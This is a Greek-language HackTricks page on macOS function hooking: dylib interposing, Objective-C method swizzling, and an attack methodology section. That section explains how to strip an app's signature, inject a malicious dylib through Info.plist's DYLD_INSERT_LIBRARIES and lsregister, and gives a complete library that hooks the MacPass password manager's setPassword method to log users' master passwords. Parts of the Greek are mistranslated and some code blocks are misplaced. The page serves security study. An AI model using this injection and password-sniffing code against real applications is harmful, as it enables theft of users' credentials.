# Συνάρτηση Hooking στο macOS

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ενδιάμεση Συνάρτηση

Δημιουργήστε ένα **dylib** με μια ενότητα **`__interpose`** (ή μια ενότητα με σημαία **`S_INTERPOSING`**) που περιέχει tuples από **δείκτες συναρτήσεων** που αναφέρονται στις **αρχικές** και **αντικατάστασης** συναρτήσεις.

Στη συνέχεια, **εισαγάγετε** το dylib με τη χρήση του **`DYLD_INSERT_LIBRARIES`** (η ενδιάμεση συνάρτηση πρέπει να γίνει πριν φορτωθεί η κύρια εφαρμογή). Φυσικά, οι [**περιορισμοί** που ισχύουν για τη χρήση του **`DYLD_INSERT_LIBRARIES`** ισχύουν και εδώ](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Ενδιάμεση συνάρτηση printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

typedef int (*orig_open_type)(const char *pathname, int flags);
typedef FILE *(*orig_fopen_type)(const char *pathname, const char *mode);

int open(const char *pathname, int flags) {
    orig_open_type orig_open;
    orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    printf("Opening file: %s\n", pathname);
    return orig_open(pathname, flags);
}

FILE *fopen(const char *pathname, const char *mode) {
    orig_fopen_type orig_fopen;
    orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
    printf("Opening file: %s\n", pathname);
    return orig_fopen(pathname, mode);
}
```

Αυτός ο κώδικας χρησιμοποιεί την τεχνική του function hooking για να παρακολουθήσει τις κλήσεις των συναρτήσεων `open` και `fopen` σε ένα πρόγραμμα στο macOS. Ο κώδικας αυτός χρησιμοποιεί τη βιβλιοθήκη `dlfcn.h` για να φορτώσει δυναμικά τις συναρτήσεις `open` και `fopen` και να αντικαταστήσει τις πρωτότυπες υλοποιήσεις τους με τις δικές του. Όταν καλείται η συνάρτηση `open` ή `fopen`, ο κώδικας αυτός εκτυπώνει το όνομα του αρχείου που ανοίγεται και στη συνέχεια καλεί την πρωτότυπη υλοποίηση της συνάρτησης για να εκτελέσει την πραγματική λειτουργία της.
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Αντικατάσταση Μεθόδων

Στην ObjectiveC έτσι καλείται μια μέθοδος: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Χρειάζεται το **αντικείμενο**, η **μέθοδος** και τα **παράμετρα**. Και όταν καλείται μια μέθοδος, στέλνεται ένα **μήνυμα** χρησιμοποιώντας τη συνάρτηση **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Το αντικείμενο είναι το **`someObject`**, η μέθοδος είναι **`@selector(method1p1:p2:)`** και τα ορίσματα είναι τα **value1**, **value2**.

Ακολουθώντας τις δομές των αντικειμένων, είναι δυνατή η πρόσβαση σε ένα **πίνακα μεθόδων** όπου οι **ονομασίες** και οι **δείκτες** του κώδικα της μεθόδου βρίσκονται.

{% hint style="danger" %}
Σημειώστε ότι επειδή οι μέθοδοι και οι κλάσεις προσπελαύνονται με βάση τα ονόματά τους, αυτές οι πληροφορίες αποθηκεύονται στο δυαδικό αρχείο, οπότε είναι δυνατή η ανάκτησή τους με τη χρήση της εντολής `otool -ov </path/bin>` ή [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Πρόσβαση στις ακατέργαστες μεθόδους

Είναι δυνατό να αποκτηθούν πληροφορίες για τις μέθοδους, όπως το όνομα, ο αριθμός των παραμέτρων ή η διεύθυνση, όπως φαίνεται στο παρακάτω παράδειγμα:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Αντικατάσταση μεθόδου με την method\_exchangeImplementations

Η συνάρτηση **`method_exchangeImplementations`** επιτρέπει την **αλλαγή** της **διεύθυνσης** της **υλοποίησης** μιας συνάρτησης με την άλλη.

{% hint style="danger" %}
Έτσι, όταν καλείται μια συνάρτηση, εκτελείται η άλλη.
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
Σε αυτήν την περίπτωση, αν ο κώδικας υλοποίησης της νόμιμης μεθόδου επαληθεύει το όνομα της μεθόδου, μπορεί να ανιχνεύσει αυτήν την αντικατάσταση και να την εμποδίσει από την εκτέλεσή της.

Η παρακάτω τεχνική δεν έχει αυτόν τον περιορισμό.
{% endhint %}

### Αντικατάσταση Μεθόδου με την method\_setImplementation

Η προηγούμενη μορφή είναι περίεργη επειδή αλλάζετε την υλοποίηση 2 μεθόδων μεταξύ τους. Χρησιμοποιώντας τη συνάρτηση **`method_setImplementation`** μπορείτε να αλλάξετε την υλοποίηση μιας μεθόδου με την υλοποίηση μιας άλλης.

Απλά θυμηθείτε να **αποθηκεύσετε τη διεύθυνση της υλοποίησης της αρχικής μεθόδου** αν πρόκειται να την καλέσετε από τη νέα υλοποίηση πριν την αντικαταστήσετε, διότι αργότερα θα είναι πολύ πιο δύσκολο να εντοπίσετε αυτήν τη διεύθυνση.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Μεθοδολογία Επίθεσης Hooking

Σε αυτήν τη σελίδα συζητήθηκαν διάφοροι τρόποι για το hooking συναρτήσεων. Ωστόσο, αυτοί περιλάμβαναν **την εκτέλεση κώδικα μέσα στη διεργασία για επίθεση**.

Για να το κάνουμε αυτό, η πιο εύκολη τεχνική που μπορούμε να χρησιμοποιήσουμε είναι να εισάγουμε ένα [Dyld μέσω μεταβλητών περιβάλλοντος ή hijacking](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Ωστόσο, υποθέτω ότι αυτό μπορεί να γίνει επίσης μέσω [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Ωστόσο, και οι δύο επιλογές είναι **περιορισμένες** σε **μη προστατευμένα** δυαδικά αρχεία/διεργασίες. Ελέγξτε κάθε τεχνική για να μάθετε περισσότερα για τους περιορισμούς.

Ωστόσο, μια επίθεση με hooking συναρτήσεων είναι πολύ συγκεκριμένη, ένας επιτιθέμενος θα το κάνει αυτό για να **κλέψει ευαίσθητες πληροφορίες από μια διεργασία** (αν δεν ήταν έτσι, θα κάνατε απλά μια επίθεση με εισαγωγή διεργασίας). Και αυτές οι ευαίσθητες πληροφορίες μπορεί να βρίσκονται σε εφαρμογές που έχει κατεβάσει ο χρήστης, όπως το MacPass.

Έτσι, ο διανοούμενος θα πρέπει είτε να βρει μια ευπάθεια είτε να αφαιρέσει την υπογραφή της εφαρμογής, να εισάγει τη μεταβλητή περιβάλλοντος **`DYLD_INSERT_LIBRARIES`** μέσω του Info.plist της εφαρμογής, προσθέτοντας κάτι όπως:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
και στη συνέχεια **επανεγγράψτε** την εφαρμογή:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Προσθέστε σε αυτή τη βιβλιοθήκη τον κώδικα hooking για να εξαγάγετε τις πληροφορίες: Κωδικοί πρόσβασης, μηνύματα...

{% hint style="danger" %}
Σημειώστε ότι σε νεότερες εκδόσεις του macOS, αν **αφαιρέσετε την υπογραφή** του δυαδικού αρχείου της εφαρμογής και αυτή έχει ήδη εκτελεστεί, το macOS **δεν θα εκτελέσει πλέον την εφαρμογή**.
{% endhint %}

#### Παράδειγμα βιβλιοθήκης
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Αναφορές

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
